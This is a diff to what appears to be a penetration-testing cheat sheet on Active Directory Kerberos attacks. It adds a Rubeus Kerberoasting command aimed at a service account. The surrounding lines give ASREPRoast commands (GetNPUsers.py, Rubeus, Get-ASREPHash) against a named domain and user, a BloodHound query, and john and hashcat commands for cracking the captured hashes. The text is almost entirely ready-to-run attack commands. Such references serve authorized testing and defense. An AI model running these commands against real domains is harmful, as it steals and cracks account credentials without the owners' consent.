@@ -21,13 +21,20 @@ You can even expand the BloodHound query to include pathes to computers from the
 `MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p`   
 
 # Kerberos Attacks
+## Kerberoasting
+From Windows against single user using Rubeus.exe:   
+`.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
 
 ## ASREPRoast 
 If accounts do not require kerberos pre-authentication, the tool GetNPUsers.py can be used to do ASREPRoasting:   
 `GetNPUsers.py -request am.mt.mtnet/us30-zherosheroes:`   
+
 On Windows:   
 `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`   
 `Get-ASREPHash -Username someuser123 -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)`   
+
+
+
 Cracking:   
 `john --wordlist=passwords_kerb.txt hashes.asreproast`   
 `hashcat --attack-mode 0 --hash-type 18200 hashes.asreproast /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt`   
